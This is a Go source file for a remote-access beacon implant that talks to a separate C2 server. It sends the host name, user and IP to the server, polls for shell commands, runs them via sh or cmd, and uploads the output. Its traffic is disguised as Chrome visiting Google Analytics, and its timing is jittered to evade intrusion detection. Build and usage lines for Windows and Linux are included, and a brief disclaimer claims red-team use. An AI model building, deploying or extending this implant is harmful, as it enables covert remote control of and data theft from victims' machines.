// beacon/main.go — NetScanGo Go Beacon Agent
//
// Communicates with reverse_shell.py's BeaconC2Server using the
// "google_analytics" malleable C2 profile.  All traffic mimics Chrome
// on Windows 10 browsing to Google Analytics endpoints.
//
// Build (cross-compile from any platform):
//
//	# Linux / macOS target
//	GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o beacon_linux ./beacon/
//
//	# Windows target (produces a tiny static EXE)
//	GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o beacon.exe ./beacon/
//
// Usage:
//
//	./beacon -c2 http://192.168.1.10:8888
//	./beacon -c2 https://192.168.1.10:8443 -insecure          # self-signed TLS
//	./beacon -c2 https://c2.example.com:443 -interval 10 -jitter 0.30
//
// LEGAL DISCLAIMER
// ----------------
// This software is for authorised penetration testing and security
// research only.  Unauthorised use is illegal and unethical.

package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"
)

// ============================================================================
// google_analytics Malleable C2 Profile
// These constants MUST stay in sync with C2_PROFILES["google_analytics"]
// defined in reverse_shell.py.
// ============================================================================

const (
	// GA profile — wire paths (method-sensitive; server dispatches by method+path)
	gaRegisterPath  = "/collect"   // POST  — initial check-in
	gaBeaconPath    = "/collect"   // GET   — task poll
	gaResultPath    = "/batch"     // POST  — result upload
	gaHeartbeatPath = "/r/collect" // POST  — lightweight keep-alive

	// GA profile — header spoofing
	gaUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
		"AppleWebKit/537.36 (KHTML, like Gecko) " +
		"Chrome/124.0.0.0 Safari/537.36"
	gaReferer = "https://www.google.com/"

	// Execution hard limits
	cmdTimeout     = 30 * time.Second
	maxOutputBytes = 4096

	// Reconnection back-off when registration fails
	retryDelay = 15 * time.Second
)

// ============================================================================
// JSON wire types (must match the server's JSON field names exactly)
// ============================================================================

// registerRequest is the body sent to gaRegisterPath.
type registerRequest struct {
	Hostname string `json:"hostname"`
	OSInfo   string `json:"os_info"`
	Username string `json:"username"`
	IP       string `json:"ip"`
}

// registerResponse is what the server sends back on successful registration.
type registerResponse struct {
	AgentID  string  `json:"agent_id"`
	Token    string  `json:"token"`
	Interval int     `json:"interval"` // seconds; server may override agent default
	Jitter   float64 `json:"jitter"`   // 0.0–1.0; server may override agent default
}

// task is the JSON returned by a successful GET to gaBeaconPath.
type task struct {
	TaskID   string `json:"task_id"`
	Type     string `json:"type"`    // "shell_cmd"
	Command  string `json:"command"`
	IssuedAt string `json:"issued_at"`
}

// resultRequest is the body POSTed to gaResultPath after execution.
type resultRequest struct {
	TaskID  string `json:"task_id"`
	Command string `json:"command"`
	Output  string `json:"output"`
	Token   string `json:"token"`
	AID     string `json:"aid"` // agent_id — used by the server's _handle_result
}

// heartbeatRequest is the body POSTed to gaHeartbeatPath.
type heartbeatRequest struct {
	AID   string `json:"aid"`
	Token string `json:"token"`
}

// ============================================================================
// Beacon
// ============================================================================

// Beacon holds all runtime state for a single agent session.
type Beacon struct {
	c2URL    string // base URL, no trailing slash
	client   *http.Client
	insecure bool   // true = skip TLS certificate verification (set by -insecure flag)
	agentID  string
	token    string
	interval time.Duration
	jitter   float64      // 0.0–1.0 fraction of interval to jitter
	rng      *rand.Rand
	log      *log.Logger
}

// newBeacon constructs a Beacon with a hardened HTTP transport.
//
// insecure=true sets InsecureSkipVerify on the TLS configuration so the
// client accepts self-signed certificates during lab / red-team testing.
// Set insecure=false when deploying against a properly CA-signed cert.
func newBeacon(c2URL string, insecure bool, interval time.Duration, jitter float64) *Beacon {
	tlsCfg := &tls.Config{
		InsecureSkipVerify: insecure, // #nosec G402 — intentional for lab mode
		MinVersion:         tls.VersionTLS12,
		// Prefer forward-secrecy ciphers (mirrors server _build_ssl_context)
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		},
	}

	transport := &http.Transport{
		TLSClientConfig: tlsCfg,
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		ForceAttemptHTTP2:     true,
		MaxIdleConns:          5,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
	}

	return &Beacon{
		c2URL:    strings.TrimRight(c2URL, "/"),
		client:   &http.Client{Transport: transport, Timeout: 15 * time.Second},
		insecure: insecure,
		interval: interval,
		jitter:   jitter,
		rng:      rand.New(rand.NewSource(time.Now().UnixNano())), //nolint:gosec
		log:      log.New(os.Stderr, "[beacon] ", log.LstdFlags),
	}
}

// ── profile header injection ─────────────────────────────────────────────────

// stamp attaches the google_analytics profile headers to every outgoing
// request so that proxy / IDS logs see imitation Chrome browsing traffic.
func (b *Beacon) stamp(req *http.Request, hasBody bool) {
	req.Header.Set("User-Agent", gaUserAgent)
	req.Header.Set("Referer", gaReferer)
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Cache-Control", "no-cache")
	if hasBody {
		req.Header.Set("Content-Type", "application/json")
	}
}

// ── jitter ───────────────────────────────────────────────────────────────────

// jitterSleep sleeps for a randomised duration:
//
//	sleep = interval ± (interval × jitterPct × uniform(-1, 1))
//
// This matches the Python _jitter_sleep() embedded in generated payloads and
// prevents the beacon traffic from displaying a metronomic inter-arrival
// pattern in IDS time-series analysis.
func (b *Beacon) jitterSleep() {
	// uniform(-1, 1)
	u := b.rng.Float64()*2 - 1
	delta := float64(b.interval) * b.jitter * u
	sleep := time.Duration(float64(b.interval) + delta)
	if sleep < 500*time.Millisecond {
		sleep = 500 * time.Millisecond
	}
	b.log.Printf("sleeping %v  (base=%v jitter=±%.0f%%)", sleep, b.interval, b.jitter*100)
	time.Sleep(sleep)
}

// ── system information ───────────────────────────────────────────────────────

// localIP returns the first non-loopback IPv4 address found on any interface.
func localIP() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return "unknown"
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil || ip.IsLoopback() {
				continue
			}
			if ip4 := ip.To4(); ip4 != nil {
				return ip4.String()
			}
		}
	}
	return "unknown"
}

// ── registration ─────────────────────────────────────────────────────────────

// Register POSTs system metadata to gaRegisterPath and stores the returned
// agent_id, token, interval, and jitter values locally.
//
// The server's malleable router handles `POST /collect` as a registration
// request regardless of the User-Agent (UA check is intentionally relaxed on
// first contact to allow agents that haven't yet adopted the profile UA).
func (b *Beacon) Register() error {
	hostname, _ := os.Hostname()

	u, err := user.Current()
	username := "unknown"
	if err == nil {
		username = u.Username
	}

	payload := registerRequest{
		Hostname: hostname,
		OSInfo:   fmt.Sprintf("%s/%s", runtime.GOOS, runtime.GOARCH),
		Username: username,
		IP:       localIP(),
	}

	body, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("marshal register payload: %w", err)
	}

	req, err := http.NewRequest(http.MethodPost, b.c2URL+gaRegisterPath, bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("build register request: %w", err)
	}
	b.stamp(req, true)

	resp, err := b.client.Do(req)
	if err != nil {
		return fmt.Errorf("register POST: %w", err)
	}
	defer func() { _, _ = io.Copy(io.Discard, resp.Body); resp.Body.Close() }()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("register: server returned HTTP %d", resp.StatusCode)
	}

	var reg registerResponse
	if err := json.NewDecoder(resp.Body).Decode(&reg); err != nil {
		return fmt.Errorf("decode register response: %w", err)
	}
	if reg.AgentID == "" {
		return fmt.Errorf("register: empty agent_id in server response")
	}

	b.agentID = reg.AgentID
	b.token = reg.Token

	// Honor server-supplied interval/jitter (operator may have tuned them)
	if reg.Interval > 0 {
		b.interval = time.Duration(reg.Interval) * time.Second
	}
	if reg.Jitter >= 0 && reg.Jitter <= 1 {
		b.jitter = reg.Jitter
	}

	b.log.Printf("registered  agent_id=%s  interval=%v  jitter=±%.0f%%",
		b.agentID, b.interval, b.jitter*100)
	return nil
}

// ── task polling ─────────────────────────────────────────────────────────────

// Poll sends a GET to gaBeaconPath with the agent's credentials as query
// parameters.  Returns (task, nil) when a command is waiting, (nil, nil) when
// the server responds 204 No Content (idle), or (nil, err) on failure.
//
// The server's router requires that the incoming User-Agent matches the
// ga UA regex; our stamp() call satisfies that requirement.
func (b *Beacon) Poll() (*task, error) {
	url := fmt.Sprintf("%s%s?token=%s&aid=%s",
		b.c2URL, gaBeaconPath, b.token, b.agentID)

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return nil, fmt.Errorf("build poll request: %w", err)
	}
	b.stamp(req, false)

	resp, err := b.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("poll GET: %w", err)
	}
	defer func() { _, _ = io.Copy(io.Discard, resp.Body); resp.Body.Close() }()

	// 204 = no pending task; agent should jitter-sleep and retry
	if resp.StatusCode == http.StatusNoContent {
		return nil, nil
	}

	// Non-200 (e.g. 302 decoy redirect) means the server didn't recognise us
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("poll: unexpected HTTP %d (UA/path mismatch?)", resp.StatusCode)
	}

	var t task
	if err := json.NewDecoder(resp.Body).Decode(&t); err != nil {
		return nil, fmt.Errorf("decode task: %w", err)
	}
	b.log.Printf("task received  id=%s  cmd=%q", t.TaskID, t.Command)
	return &t, nil
}

// ── command execution ─────────────────────────────────────────────────────────

// Execute runs t.Command via the OS shell, capturing combined stdout+stderr.
// A CmdTimeout hard cap prevents runaway processes from blocking the beacon.
func (b *Beacon) Execute(t *task) string {
	if t.Command == "" {
		return "(empty command)"
	}
	b.log.Printf("executing [%s]: %q", t.TaskID, t.Command)

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", t.Command)
	} else {
		cmd = exec.Command("sh", "-c", t.Command)
	}

	var buf bytes.Buffer
	cmd.Stdout = &buf
	cmd.Stderr = &buf

	done := make(chan error, 1)
	go func() { done <- cmd.Run() }()

	select {
	case <-time.After(cmdTimeout):
		if cmd.Process != nil {
			_ = cmd.Process.Kill()
		}
		return fmt.Sprintf("(killed: exceeded %v timeout)", cmdTimeout)

	case runErr := <-done:
		output := buf.String()
		if len(output) > maxOutputBytes {
			output = output[:maxOutputBytes] + "\n...(output truncated)"
		}
		if runErr != nil && output == "" {
			return fmt.Sprintf("(exit error: %v)", runErr)
		}
		return output
	}
}

// ── result submission ─────────────────────────────────────────────────────────

// SendResult POSTs the execution output back to gaResultPath.
// The server's _handle_result reads agent_id from the JSON "aid" field and
// token from the "token" field; both must be present and valid.
func (b *Beacon) SendResult(t *task, output string) error {
	payload := resultRequest{
		TaskID:  t.TaskID,
		Command: t.Command,
		Output:  output,
		Token:   b.token,
		AID:     b.agentID,
	}

	body, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("marshal result: %w", err)
	}

	req, err := http.NewRequest(http.MethodPost, b.c2URL+gaResultPath, bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("build result request: %w", err)
	}
	b.stamp(req, true)

	resp, err := b.client.Do(req)
	if err != nil {
		return fmt.Errorf("result POST: %w", err)
	}
	defer func() { _, _ = io.Copy(io.Discard, resp.Body); resp.Body.Close() }()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("result: server returned HTTP %d", resp.StatusCode)
	}

	b.log.Printf("result submitted  task_id=%s  output_len=%d", t.TaskID, len(output))
	return nil
}

// ── heartbeat ────────────────────────────────────────────────────────────────

// Heartbeat POSTs a lightweight keep-alive so the server's eviction monitor
// doesn't remove this agent between long idle periods.
func (b *Beacon) Heartbeat() {
	payload := heartbeatRequest{AID: b.agentID, Token: b.token}
	body, _ := json.Marshal(payload)

	req, err := http.NewRequest(http.MethodPost, b.c2URL+gaHeartbeatPath, bytes.NewReader(body))
	if err != nil {
		return
	}
	b.stamp(req, true)

	resp, err := b.client.Do(req)
	if err != nil {
		b.log.Printf("heartbeat error: %v", err)
		return
	}
	defer func() { _, _ = io.Copy(io.Discard, resp.Body); resp.Body.Close() }()
}

// ── main beacon loop ─────────────────────────────────────────────────────────

// Run is the entry-point for the agent lifecycle.
//
//  1. Registers with exponential-back-off retry (survives temporary network
//     outages on startup).
//  2. Enters an infinite select loop driven by a time.Ticker.
//  3. On each tick: polls for a task, executes it, uploads the result.
//  4. A separate heartbeat ticker fires every 30 s to keep the agent alive
//     during long idle windows.
func (b *Beacon) Run() {
	// ── 1. registration with back-off ──────────────────────────────────────
	backoff := retryDelay
	for {
		if err := b.Register(); err != nil {
			b.log.Printf("registration failed (%v) — retrying in %v", err, backoff)
			time.Sleep(backoff)
			// Simple bounded exponential back-off (cap at 5 min)
			backoff *= 2
			if backoff > 5*time.Minute {
				backoff = 5 * time.Minute
			}
			continue
		}
		break
	}

	// ── 2. polling + heartbeat tickers ────────────────────────────────────
	// We deliberately do NOT use a fixed ticker for polling because the
	// sleep duration is jittered on every iteration.  We use time.After
	// inside the loop instead.

	heartbeatTicker := time.NewTicker(30 * time.Second)
	defer heartbeatTicker.Stop()

	b.log.Println("beacon loop started")

	for {
		// ── 3. try to get a task ───────────────────────────────────────────
		t, err := b.Poll()
		switch {
		case err != nil:
			b.log.Printf("poll error: %v", err)

		case t != nil && t.Command != "":
			switch t.Type {
			case "start_proxy":
				// Launch the SOCKS5 muxer as a non-blocking goroutine so the
				// beacon continues to poll for shell commands in parallel.
				b.log.Printf("start_proxy task received  ws_url=%s", t.Command)
				go b.RunProxy(t.Command)
			default:
				// shell_cmd (and any future synchronous task types)
				output := b.Execute(t)
				if sendErr := b.SendResult(t, output); sendErr != nil {
					b.log.Printf("send result error: %v", sendErr)
				}
			}
		}

		// ── 4. drain heartbeat ticker if it fired during execution ─────────
		select {
		case <-heartbeatTicker.C:
			go b.Heartbeat() // fire and forget; don't block poll loop
		default:
		}

		// ── 5. jittered sleep before next poll ────────────────────────────
		b.jitterSleep()
	}
}

// ============================================================================
// Entry point
// ============================================================================

func main() {
	c2URL    := flag.String("c2",       "http://127.0.0.1:8888", "C2 server base URL  (http[s]://host:port)")
	insecure := flag.Bool("insecure",   false,                    "Skip TLS certificate verification (self-signed certs)")
	interval := flag.Int("interval",    5,                        "Base beacon interval in seconds")
	jitterPct := flag.Float64("jitter", 0.20,                     "Jitter fraction 0.0–1.0  (0.20 = ±20%)")
	flag.Parse()

	if *c2URL == "" {
		fmt.Fprintln(os.Stderr, "error: -c2 flag is required")
		os.Exit(1)
	}
	if *jitterPct < 0 || *jitterPct > 1 {
		fmt.Fprintln(os.Stderr, "error: -jitter must be between 0.0 and 1.0")
		os.Exit(1)
	}

	// Note: the server may override interval/jitter in the register response;
	// the values supplied here are the local defaults used before registration.
	b := newBeacon(
		*c2URL,
		*insecure,
		time.Duration(*interval)*time.Second,
		*jitterPct,
	)
	b.Run()
}
